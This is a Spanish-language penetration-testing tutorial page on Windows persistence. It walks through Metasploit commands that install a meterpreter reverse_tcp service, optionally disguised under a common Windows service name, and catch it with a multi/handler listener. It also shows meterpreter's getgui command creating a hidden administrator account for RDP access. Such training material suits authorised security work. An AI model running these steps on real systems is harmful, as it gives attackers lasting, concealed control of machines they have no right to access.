# Persistencia en Windows

La persistencia consiste en técnicas usadas para mantener el acceso a un sistema a pesar de los reinicios, cambios de credenciales y otras interrupciones que puedan afectar al acceso. Estas técnicas incluyen cualquier acceso, acción o cambio de configuración que permita mantener un punto de apoyo en el sistema. Pueden ser reemplazar o secuestrar (hijacking) código legítimo.

Hijacking significa alterar el flujo normal de ejecución de un programa legítimo para que el sistema ejecute el código del atacante de forma automática y repetitiva.

## Persistencia mediante servicios

Para esta técnica podemos usar el módulo `persistence_service` de metasploit (`exploit/windows/persistence/service` en versiones recientes). Su funcionamiento consiste en los siguientes pasos:

1. Generar un ejecutable (payload).
2. Cargar un ejecutable en el sistema objetivo.
3. Crear un servicio persistente. 
4. Este servicio ejecuta el payload cada vez que se encuentra activo.

```bash
msf > use exploit/windows/persistence/service
[*] Using configured payload windows/meterpreter/reverse_tcp
msf exploit(windows/persistence/service) > set lport <puerto> # debe ser distinto a la sesión actual
msf exploit(windows/persistence/service) > set session <id>
# lo siguiente no es necesario para la ejecución, pero permite 
# ocultar el servicio si le damos el nombre de un servicio común en windows
msf exploit(windows/persistence/service) > set service_name <nombre>
msf exploit(windows/persistence/service) > exploit
```

Una vez creado el servicio, podemos establecer una sesión en cualquier momento sin necesidad de volver a explotar el sistema. es necesario configurar las mismas opciones que en el payload y no lo es especificar el objetivo.

```bash
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost <ip>
msf exploit(multi/handler) > set lport <puerto>
msf exploit(multi/handler) > exploit
```

## Persistencia vía RDP

En este tipo de persistencia se modifican archivos y configuraciones del sistema al crear un nuevo usuario, por lo que es necesario tener consentimiento explícito y definir el alcance.

Para la persistencia vía RDP necesitamos una sesión estable, por lo que es recomendable migrar a [explorer](02_win_enum.md#Procesos-con-meterpreter).

Los pasos que debemos dar son:

1. Crear un usuario (necesitamos permisos de administrador).
2. Habilitar RDP si esta deshabilitado.
3. Ocultar el usuario en la pantalla de inicio de sesión de Windows.
4. Añadir el usuario al grupo de administradores y de RDP.

**Crear el usuairo con meterpreter**

Este comando se encarga de ejecutar todos los pasos mencionados antes.

```bash
meterpreter > getgui -e -u <usr_name> -p <usr_pass>
```

Una vez creado el usuario deberiamos tener acceso gráfico al sistema usando:

```bash
usr@hostname:~# xfreerdp /u:usuario /p:contraseña /v:ip
```

[⟵ Anterior](07_linux_privesc.md) | [Siguiente ⟶](09_linux_pers.md)

